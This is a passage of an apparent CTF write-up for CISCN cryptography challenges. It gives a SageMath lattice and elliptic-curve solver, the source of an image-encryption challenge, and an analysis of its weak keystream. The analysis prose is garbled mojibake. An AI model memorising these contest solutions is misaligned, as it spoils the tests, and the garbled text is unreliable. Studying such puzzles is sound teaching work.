class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p_puls_q</span>(<span class="params">f,k</span>):</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    b = k</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        a = (s+b) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> f.subs(x==a) &gt; <span class="number">0</span>:</span><br><span class="line">            s = a </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b = a</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span>(<span class="params">pq,n</span>):</span></span><br><span class="line">    p = var(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> pq^<span class="number">2</span> - <span class="number">4</span>*n&lt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    f = p^<span class="number">2</span> - pq*p+n</span><br><span class="line">    r = f.roots()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">0</span>]&gt;<span class="number">0</span>:</span><br><span class="line">            res.append(<span class="built_in">int</span>(i[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">return</span> (res[<span class="number">0</span>],res[<span class="number">1</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p1 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    <span class="keyword">if</span> p2 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p1</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] <span class="keyword">and</span> (p1[<span class="number">1</span>] != p2[<span class="number">1</span>] <span class="keyword">or</span> p1[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>]:</span><br><span class="line">        tmp = (<span class="number">3</span> * p1[<span class="number">0</span>] * p1[<span class="number">0</span>]) * <span class="built_in">int</span>(inverse_mod(<span class="number">2</span> * p1[<span class="number">1</span>], n)) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = (p2[<span class="number">1</span>] - p1[<span class="number">1</span>]) * <span class="built_in">int</span>(inverse_mod(p2[<span class="number">0</span>] - p1[<span class="number">0</span>], n) )% n</span><br><span class="line">    x = (tmp * tmp - p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) % n</span><br><span class="line">    y = (tmp * (p1[<span class="number">0</span>] - x) - p1[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">n, p</span>):</span></span><br><span class="line">    r = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            r = add(r, tmp)</span><br><span class="line">        n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp, tmp)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">sn = <span class="built_in">round</span>(sqrt(n))</span><br><span class="line">L  = [[sn,e],[<span class="number">0</span>,-n]]</span><br><span class="line">L = matrix(L)</span><br><span class="line">R = L.LLL()[<span class="number">0</span>]</span><br><span class="line">x = <span class="built_in">abs</span>(R[<span class="number">0</span>]) // sn</span><br><span class="line">s = <span class="built_in">abs</span>(R[<span class="number">1</span>])</span><br><span class="line">A = <span class="built_in">round</span>(n ^ <span class="number">0.25</span>)^<span class="number">2</span></span><br><span class="line">y = (e * x  - s )//n</span><br><span class="line">kk =  (e * x - y * n ) // y</span><br><span class="line">x = var(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">f =(<span class="number">3</span>*(kk-<span class="number">1</span>)*x-<span class="number">3</span>*x^<span class="number">2</span>)^<span class="number">2</span> - A*(x^<span class="number">2</span>-<span class="number">4</span>*n)</span><br><span class="line"></span><br><span class="line">ppq = find_p_puls_q(f,kk)</span><br><span class="line">p,q =find_p(ppq+<span class="number">1</span>,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b = - ( c[<span class="number">0</span>] ** <span class="number">3</span> - c[<span class="number">1</span>]**<span class="number">2</span>) % p</span><br><span class="line">E = EllipticCurve(GF(p), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, b])</span><br><span class="line">P = E(c)</span><br><span class="line">o = P.order()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = inverse_mod(e,o)</span><br><span class="line">m = d * E(c)</span><br><span class="line">print(long_to_bytes(m[<span class="number">0</span>])+long_to_bytes(m[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><h1 id="0x02-imageencrypt"><a href="#0x02-imageencrypt" class="headerlink" title="0x02 imageencrypt"></a>0x02 imageencrypt</h1><h2 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag,image,r,key1,key2</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(flag[:<span class="number">5</span>]==<span class="string">&#x27;CISCN&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">str</span>(r))==<span class="number">3</span>)</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,image))</span><br><span class="line"><span class="keyword">assert</span>(flag[<span class="number">6</span>:-<span class="number">1</span>] == md5.new(data).hexdigest())</span><br><span class="line"><span class="keyword">assert</span>(key1&lt;<span class="number">256</span>)</span><br><span class="line"><span class="keyword">assert</span>(key2&lt;<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">x0 = random.random()</span><br><span class="line">x0 = <span class="built_in">round</span>(x0,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x),<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pixel,key1,key2,x0,m,n</span>):</span></span><br><span class="line">    num = m*n/<span class="number">8</span>    </span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x  = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix </span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">flagimage = image</span><br><span class="line">testimage = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    testimage.append(random.randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line"><span class="built_in">print</span> testimage</span><br><span class="line"><span class="built_in">print</span> encrypt(testimage,key1,key2,x0,<span class="number">16</span>,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> encrypt(flagimage,key1,key2,x0,<span class="number">24</span>,<span class="number">16</span>)</span><br></pre></td></tr></table></figure><h2 id="analyses-1"><a href="#analyses-1" class="headerlink" title="analyses"></a>analyses</h2><p>è¿™é¢˜åšçš„æ—¶å€™æ²¡å¥½å¥½åˆ†æï¼Œæœ‰äº›ç»“æœæ²¡è¿½ç©¶åˆ°åº•æ˜¯ä¸ºå•¥ï¼Œæ‹¿åˆ°äº†å°±å¼€å§‹çˆ†ç ´äº†ï¼Œç°åœ¨å¥½å¥½åˆ†æä¸€ä¸‹ã€‚</p><p>è¿™é‡Œæ¨¡æ‹Ÿäº†ä¸€ä¸ªå›¾ç‰‡çš„åŠ å¯†ï¼ŒåŠ å¯†ä¼šæœ‰ä¸€ä¸ªèŒƒå›´åœ¨$[0,1)$çš„å…­ä½å°æ•°åˆå§‹å€¼$x0$ï¼Œä»¥åŠä¸€ä¸ªå’±ä»¬ä¸çŸ¥é“çš„å‚æ•°$r$ï¼Œä½†æ˜¯è¿™ä¸ªå‚æ•°æœ‰ä¸€ä¸ªhintï¼Œ<code>len(str(r))Â ==Â 3</code>ï¼Œä¸è¿‡è¿™ä¸ªhintä¸€å¼€å§‹è¯¯å¯¼æˆ‘äº†ã€‚ã€‚ã€‚</p><p>å…ˆæ¥çœ‹çœ‹å…·ä½“çš„åŠ å¯†è¿‡ç¨‹ã€‚åŠ å¯†å¤§æ¦‚å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªè¿‡ç¨‹</p><ol><li>bitstreamç”Ÿæˆ</li><li>æ ¹æ®bitstream key1 key2å¯¹å›¾ç‰‡è¿›è¡ŒåŠ å¯†</li></ol><h3 id="bitstreamç”Ÿæˆ"><a href="#bitstreamç”Ÿæˆ" class="headerlink" title="bitstreamç”Ÿæˆ"></a>bitstreamç”Ÿæˆ</h3><p>bitstreamçš„ç”Ÿæˆè·Ÿä¸¤ä¸ªå˜é‡æœ‰å…³$x0,r$ï¼Œç¡®å®šçš„è¿™ä¸¤ä¸ªå‚æ•°é‚£ä¹ˆç”Ÿæˆçš„bitstreamå°†ä¼šä¸€æ¨¡ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®ç”Ÿæˆbitstreamçš„å‡½æ•°å†™å‡ºè¿™ä¸¤ä¸ªå˜é‡çš„ä¸€ä¸ªå…³ç³»<br>$$<br>x_{n+1} \approx r \cdot x_n (3 - x_n) \\<br>r \approx {x_{n+1} \over x_n(3-x_n)} \tag 1<br>$$<br>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦ç¡®å®šä¸¤ä¸ª$x$å°±èƒ½å¤§æ¦‚çš„ç®—å‡º$r$äº†ï¼Œå…ˆè®°ä¸º$(1)$ï¼Œåé¢æœ‰ç”¨</p><p>è€Œbitstreamæ˜¯æ ¹æ®ç”Ÿæˆçš„åºåˆ—$x_1,x_2,â€¦x_n$æ¥ç”Ÿæˆçš„ï¼Œå…·ä½“æ˜¯è¿™æ ·<br>$$<br>bin(x_1) | bin(x_2)|â€¦|bin(x_n)<br>$$<br>è¿™é‡Œçš„$|$æ˜¯æ‹¼æ¥ï¼Œè€Œä¸”$bin(x_i)$åœ¨é•¿åº¦ä¸å¤Ÿ16çš„æ—¶å€™ä¼šåœ¨å‰é¢å¡«å……0åˆ°é•¿åº¦ä¸º16</p><h3 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h3><p>æˆ‘ä»¬æŠŠbitstreamæ¯ä¸¤ä½çœ‹æˆä¸€ä¸ª$X$ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯”ç‰¹æµæ˜¯è¿™æ ·çš„-&gt;$X_1,X_2,â€¦X_n$ï¼Œæ˜¾ç„¶$X$çš„èŒƒå›´æ˜¯$[0,3]$</p><p>å†è¯´åŠ å¯†è¿‡ç¨‹ä¹‹å‰ï¼Œå¾—å…ˆäº†è§£ä¸€ä¸ªå°çŸ¥è¯†<code>(~a ^ a )</code>ä¼šæŠŠ$a$çš„æ‰€æœ‰ä½éƒ½ç½®ä¸º1</p><p>å¥½äº†ï¼Œç°åœ¨æ¥çœ‹æ•´ä¸ªåŠ å¯†è¿‡ç¨‹</p><p>è¿™é‡Œçš„å›¾ç‰‡å…¶å®å°±æ˜¯ä¸€ä¸ªèŒƒå›´åœ¨$[0,256]$çš„æ•°çš„åºåˆ—$m_1,m_2,m_3,â€¦,m_n$</p><p>ä¸€å—å…¬å¼ç›´æ¥æå®šåŠ å¯†ï¼(å…¬å¼é‡Œçš„-méƒ½æ˜¯mçš„åç çš„æ„æ€)<br>$$<br>m_i =<br>\begin{cases}<br>m_i \oplus key_1 , X_i =0 \\<br>-m_i \oplus key_1, X_i = 1 \\<br>m_i \oplus key_2, X_i = 2 \\<br>-m_i \oplus key_2, X_i = 3<br>\end{cases}<br>$$<br>æ‰€ä»¥æ•´ä¸ªåŠ å¯†å°±æ˜¯ç”±bitstreamæ¥å†³å®šä½¿ç”¨å“ªä¸ªå¯†é’¥å’Œæ“ä½œ</p><p>é¢˜ç›®ç»™äº†ä¸‰ä¸ªå›¾ç‰‡æ•°æ®$M_1,C_1,C_2$ï¼Œè¦æ±‚$M_2$</p><p>è¿™é‡Œæˆ‘ä»¬è®¡ç®—$M_1 \oplus C_1$ï¼Œå¦‚æœæ˜¯ä¸å–åçš„æ“ä½œï¼Œé‚£ä¹ˆå¼‚æˆ–å‡ºæ¥çš„å°±æ˜¯keyï¼Œ$m_i \oplus key \oplus m_i = key$</p><p>å¦‚æœæ˜¯è¿›è¡Œäº†å–åæ“ä½œçš„ï¼Œé‚£ä¹ˆå¼‚æˆ–å‡ºæ¥çš„å°±æ˜¯keyçš„åç ï¼Œ$-m_i \oplus m_i \oplus key = -key $</p><p>æ‰€ä»¥æœ€åæ•´ä¸ªå›¾ç‰‡å¼‚æˆ–ä¸‹æ¥ï¼Œå‡ºç°çš„æ•°æ®åªä¼šæœ‰å››ä¸ªæ•°å­—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">78</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">169</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">78</span>, <span class="number">78</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">177</span>, <span class="number">169</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">169</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">169</span>, <span class="number">169</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">169</span>, <span class="number">169</span>, <span class="number">169</span>, <span class="number">86</span>, <span class="number">169</span>, <span class="number">78</span>, <span class="number">78</span>, <span class="number">78</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">177</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">169</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">169</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">177</span>, <span class="number">169</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">169</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">169</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">169</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">86</span>, <span class="number">169</span>, <span class="number">169</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">169</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">78</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">177</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">169</span>, <span class="number">169</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">169</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">169</span>, <span class="number">78</span>, <span class="number">78</span>, <span class="number">78</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">169</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">169</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">177</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">177</span>, <span class="number">169</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">169</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">86</span>, <span class="number">169</span>, <span class="number">86</span>, <span class="number">177</span>, <span class="number">86</span>, <span class="number">177</span>]</span><br></pre></td></tr></table></figure><p><code>[169,177,86,78]</code>ï¼Œè€Œ169å¯¹åº”çš„åç æ˜¯86ï¼Œ177å¯¹åº”78</p><p>ç°åœ¨é—®é¢˜æ¥äº†ï¼Œæœ‰äº†è¿™ä¸ªèƒ½å¹²å˜›</p><p>èƒ½å¦é€šè¿‡è¿™å››ä¸ªæ•°å­—è¿˜åŸå›bitstreamå‘¢ï¼Œæˆ‘ä»¬çŸ¥é“bitstreamæ˜¯å†³å®šä½¿ç”¨å“ªä¸ªå¯†é’¥çš„ï¼Œè€Œå¯†é’¥çš„ä½¿ç”¨é¡ºåºæˆ‘ä»¬æ˜¯çŸ¥é“çš„(æˆ‘ä»¬åªæ˜¯ä¸çŸ¥é“å“ªä¸ªæ˜¯key1 å“ªä¸ªæ˜¯key2)ï¼Œæˆ‘ä»¬å¯ä»¥ä¸€ä¸€å‡è®¾ä¸€ä¸‹ï¼Œä¹Ÿå°±8ç§ç»„åˆ</p><table><thead><tr><th></th><th>key1</th><th>key2</th><th>~key1</th><th>~key2</th></tr></thead><tbody><tr><td></td><td>86</td><td>78</td><td>169</td><td>177</td></tr><tr><td></td><td>86</td><td>177</td><td>169</td><td>78</td></tr><tr><td></td><td>169</td><td>177</td><td>86</td><td>78</td></tr><tr><td></td><td>169</td><td>78</td><td>86</td><td>177</td></tr><tr><td></td><td>78</td><td>169</td><td>177</td><td>86</td></tr><tr><td></td><td>78</td><td>86</td><td>177</td><td>169</td></tr><tr><td></td><td>177</td><td>86</td><td>78</td><td>169</td></tr><tr><td></td><td>177</td><td>169</td><td>78</td><td>86</td></tr><tr><td>Xi</td><td>00</td><td>10</td><td>01</td><td>11</td></tr></tbody></table><p>æ¯ç§ç»„åˆä¸­ï¼Œæ¯ä¸ªæ•°å­—éƒ½å¯¹åº”ä¸€ä¸ª$X_i$ï¼Œæˆ‘ä»¬å°±èƒ½åˆ©ç”¨æ•°å­—çš„é¡ºåºï¼Œè¿˜åŸå‡ºè¿™ç§ç»„åˆä¸‹æ‰€ç”¨çš„bitstreamï¼Œä¹Ÿå°±æ˜¯è¿˜åŸå‡º<br>$$<br>\hat X_1 , \hat X_2 , â€¦ ,\hat X_i<br>$$<br>è¿™é‡Œç”¨$\hat X$è€Œä¸æ˜¯$X$å°±æ˜¯å› ä¸ºè¿˜åŸå‡ºçš„ä¸ä¸€å®šæ˜¯å¯¹çš„ï¼Œåªæœ‰ä¸Šé¢çš„8ç§æƒ…å†µä¸­çš„1ç§æ‰æœ‰å¯èƒ½å¯¹</p><p>å› ä¸º$X \approx 22000 \cdot x$ä¸Šé¢çš„$(1)$<br>$$<br>r \approx {x_{n+1} \over x_n(3-x_n)} \approx {X_{n+1} \over X_n(3 - X_n) }\cdot {1 \over 22000}<br>$$<br>éšä¾¿æ‰¾äº†å‡ ä¸ªç»„åˆè¯•äº†ä¸‹ç®—$r$ï¼Œå‘ç°éƒ½åœ¨$[0,2]$ä¸­ï¼Œå†æ ¹æ®æç¤º<code>len(r) == 3</code>ï¼Œ$r$åº”è¯¥æ˜¯ä¸ªä¸€ä½å°æ•°ï¼Œæ¯”å¦‚$0.5,1.3$è¿™ç§ï¼ˆä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯3ä½æ•°ï¼Œå‡ ç™¾çš„é‚£ç§ï¼Œè®©æˆ‘æ‡µäº†å¥½ä¹…è‰¹</p><p>ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç¡®å®šä¸€ç§ç»„åˆï¼Œæ¥ç¡®å®šå¯¹åº”çš„$r$å’Œ$bitstream$ï¼Œä½†æ˜¯åŠ å¯†$M_2$ç”¨çš„bitstreamæ¯”åŠ å¯†$M_1$çš„é•¿ï¼Œæ‰€ä»¥æƒ³ç»§ç»­å¾€ä¸‹ç®—bitstreamï¼Œæˆ‘ä»¬è¿˜éœ€è¦$x0$</p><p>å‰é¢æˆ‘ä»¬çŸ¥é“ï¼Œ$x0$æ˜¯å…­ä½çš„å°äº1çš„å°æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€å…±ä¹Ÿå°±$1000000$ç§å¯èƒ½ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨çŒœçš„$x0$å’Œç®—å‡ºæ¥çš„$r$æ¥ç”Ÿæˆbitstreamï¼Œçœ‹å¾—åˆ°çš„bitstreamå’Œæˆ‘ä»¬ç®—$r$çš„bitstreamæ˜¯å¦ç›¸ç­‰æ¥çˆ†ç ´$x0$ï¼Œ8ç§ç»„åˆè¯•å®Œä¹Ÿå°±$8000000$ï¼Œååˆ†é’Ÿä¸åˆ°å°±èƒ½è§£å†³ã€‚</p><p>çˆ†ç ´å‡º$x0$ï¼Œæ‰€æœ‰å‚æ•°éƒ½å¯ä»¥å¯¹åº”çš„ç¡®å®šä¸‹æ¥äº†ã€‚</p><p>å‰©ä¸‹çš„å°±æ˜¯é‡æ–°ç®—ä¸€æ¬¡bitstreamï¼Œç›´åˆ°é•¿åº¦å¤Ÿç”¨æ¥è§£å¯†$C_2$ï¼Œè§£å¯†å°±å®Œäº‹äº†</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 